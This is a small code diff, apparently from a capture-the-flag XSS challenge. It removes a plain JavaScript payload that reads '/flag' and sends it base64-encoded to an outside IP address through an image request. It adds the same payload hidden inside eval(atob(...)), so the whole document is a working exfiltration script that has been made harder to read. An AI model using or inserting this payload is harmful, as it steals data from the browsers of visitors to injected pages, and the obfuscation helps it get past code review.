@@ -1,4 +1,1 @@
-fetch('/flag').then(r=>r.text()).then(d=>{
-  var img = new Image();
-  img.src = 'http://62.210.214.88:8321/?flag=' + btoa(d);
-});
+eval(atob('ZmV0Y2goJy9mbGFnJykudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT57CiAgdmFyIGltZyA9IG5ldyBJbWFnZSgpOwogIGltZy5zcmMgPSAnaHR0cDovLzYyLjIxMC4yMTQuODg6ODMyMS8/ZmxhZz0nICsgYnRvYShkKTsKfSk7'))
